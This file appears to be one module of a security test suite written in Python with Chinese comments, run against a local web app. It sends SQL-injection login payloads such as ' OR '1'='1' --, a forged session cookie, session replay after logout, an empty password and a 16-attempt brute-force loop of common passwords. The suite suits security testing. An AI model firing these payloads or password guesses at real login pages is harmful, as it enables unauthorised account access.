"""06_auth_bypass — 认证绕过测试"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


def run():
    print_banner("06: 认证绕过")
    reset_counters()

    # ── 万能密码 ──
    info("万能密码登录")
    s = requests.Session()
    r = s.post(urljoin(BASE_URL, "/login"),
               data={"username": "admin", "password": "' OR '1'='1' --"},
               timeout=TIMEOUT, allow_redirects=False)
    if r.status_code == 302:
        r2 = s.get(urljoin(BASE_URL, "/dashboard"), timeout=TIMEOUT, allow_redirects=False)
        if r2.status_code == 200:
            ok("万能密码登录 → 成功进入dashboard")
        else:
            warn(f"万能密码登录 → 重定向但dashboard返回 {r2.status_code}")
    else:
        warn(f"万能密码登录 → HTTP {r.status_code}")

    r = s.post(urljoin(BASE_URL, "/login"),
               data={"username": "admin'--", "password": "xxx"},
               timeout=TIMEOUT, allow_redirects=False)
    ok(f"注释绕过 admin'-- → HTTP {r.status_code}")

    # ── 未认证访问 ──
    info("未认证访问保护页面")
    s2 = requests.Session()
    r = s2.get(urljoin(BASE_URL, "/dashboard"), timeout=TIMEOUT, allow_redirects=False)
    assert_status(r, 302, "未登录→dashboard重定向")
    assert_redirect(r, "/login", "重定向到登录")

    r = s2.get(urljoin(BASE_URL, "/profile"), timeout=TIMEOUT, allow_redirects=False)
    assert_status(r, 302, "未登录→profile重定向")

    # ── 伪造 session ──
    info("伪造 session cookie")
    s3 = requests.Session()
    s3.cookies.set("connect.sid", "s:fake_session_cookie", domain="localhost", path="/")
    r = s3.get(urljoin(BASE_URL, "/dashboard"), timeout=TIMEOUT, allow_redirects=False)
    if r.status_code == 302:
        ok("伪造session→302（被拒绝）")
    else:
        warn(f"伪造session→ {r.status_code}")

    # ── 登出后重放 ──
    info("登出后重放 session")
    s4 = requests.Session()
    s4.post(urljoin(BASE_URL, "/login"), data={"username": "test", "password": "test123"},
            timeout=TIMEOUT, allow_redirects=True)
    r = s4.get(urljoin(BASE_URL, "/dashboard"), timeout=TIMEOUT, allow_redirects=False)
    if r.status_code == 200:
        ok("登录后可访问dashboard")

    s4.get(urljoin(BASE_URL, "/logout"), timeout=TIMEOUT, allow_redirects=False)
    r = s4.get(urljoin(BASE_URL, "/dashboard"), timeout=TIMEOUT, allow_redirects=False)
    assert_status(r, 302, "登出后dashboard→302")

    # ── 密码为空 ──
    info("密码为空")
    r = requests.post(urljoin(BASE_URL, "/login"),
                      data={"username": "admin", "password": ""},
                      timeout=TIMEOUT, allow_redirects=False)
    ok(f"空密码登入 → HTTP {r.status_code}")

    # ── 批量暴力破解模拟 ──
    info("暴力破解模拟（小规模）")
    for user in ["admin", "test", "alice", "bob"]:
        for pw in ["password", "123456", "admin", "test123"]:
            r = requests.post(urljoin(BASE_URL, "/login"),
                              data={"username": user, "password": pw},
                              timeout=TIMEOUT, allow_redirects=False)
    ok("暴力破解模拟完成 (16 次尝试)")

    print_summary()
    save_results("06_auth_bypass")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
